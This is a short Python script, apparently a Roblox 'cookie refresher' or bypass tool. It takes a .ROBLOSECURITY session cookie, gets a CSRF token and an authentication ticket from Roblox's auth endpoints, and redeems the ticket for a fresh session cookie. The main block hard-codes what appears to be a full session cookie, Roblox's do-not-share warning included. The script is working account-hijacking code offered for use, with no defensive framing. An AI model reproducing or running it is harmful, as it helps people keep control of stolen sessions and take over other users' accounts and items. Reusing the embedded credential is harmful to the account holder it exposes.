import requests

class Bypass:
    def __init__(self, cookie: str) -> None:
        self.cookie = cookie
    
    def start_process(self) -> str:
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            raise ValueError("An error occurred while getting the set_cookie")
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1", 
                "referer": "https://www.roblox.com/camel", 
                "Content-Type": "application/json", 
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        ticket = response.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise ValueError("An error occurred while getting the rbx-authentication-ticket")
        return ticket
        
    def get_csrf_token(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v2/logout", 
            cookies={".ROBLOSECURITY": self.cookie}
        )
        xcsrf_token = response.headers.get("x-csrf-token")
        if not xcsrf_token:
            raise ValueError("An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie")
        return xcsrf_token

if __name__ == "__main__":
    print(Bypass("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_594E90BE4B7E21DE2FFCFD54C08D3AD6135FFEFD6EA996B322E19D51F1AAE1E1BB5D11EB74719D54A3622164F5A71AD920EE2668E35644AD716C30C6AB9CCCD012EB56CF02560423DACA6B0A4B829F5AEB4F061EE807EA7B6EFCF4EABECD6F44109AA75E084D629E7043886AAA6FFB965245D8F38BED5003EC3CA95E540C9488728B128F0642757AC7A2DD75C74B3E0441641BD3D921D78FEAA5A68FEE63F04344998B9C42162C21B63C05F2518886425699040CC728921B9A6448BA618563065ACC0917B5F21CA7DF88F71F160D6D06F8CFFD25F63B421EC48E25D7771150814D13EF5E6317941429660697217C731089D9EB46D461154D92356EEDC35B75B8990F0286BFA9C09B3EFA5CD979037C01DF4B60CEE12F522CAA36D774E6DBE8E50BD1C2D0FBB2D0127351EC45BCF11E999D78C33D441D50800A8270132D1592FA95676F4C7DAC0368E7084E5838ED0358869A913E9FC8C2A5D7019C43FCC651F89556D41D65F1D6BF1FBD8139BD4D39BC4FA729556C15E91C21C888D5751FF84436910365A6F677C522230881D98489B21AA06634F48D90CB2B2C12BB468F214F05900BE2865E96172DD0C9537743EBC348BA2A2721A683785FABC238FB25E8A2AF191285BD2E6FB2387FFD1AB87A752B6419FA08FFDA33B0FFA35F0E2ECC2DCA126EF84AE206D08A09D0CE82A51D5E71D95D9C2578410E4CFD09CB1752DA75B926ADF470E2A4D921D76ED3671F38AEDB8976CC41AED24DC5A19FA2DCC4EAD6E0CE65CD31459F86E30640D056A811A11031117EAED9A97752AD847A55C8FCD504E62D8063555BE2F93375D05C53BE55A51F1ACAD054CBA1698934624A46B7682C945F5767393B9555D1EBFE98EAC3262DF269B84D40DF9D10D33C0950AE8A74B8CEE6E025879392CBC9E6E3E3654C649738C77DC0C5CF789E8B5220260066CBDE46B2DFCE7301B84E60A55A7D04A76772972342EEA13BCFF3AAD16586CF7629ED69D4DCEAF171C836FF8B9176F94F8CFF862AF1BEB56649CD930AF06C97739D27D913163C567F4AE4B213ED387E54C93D2262D53A65BCFB0CFB7FF3CA567B816804FE2849").start_process())
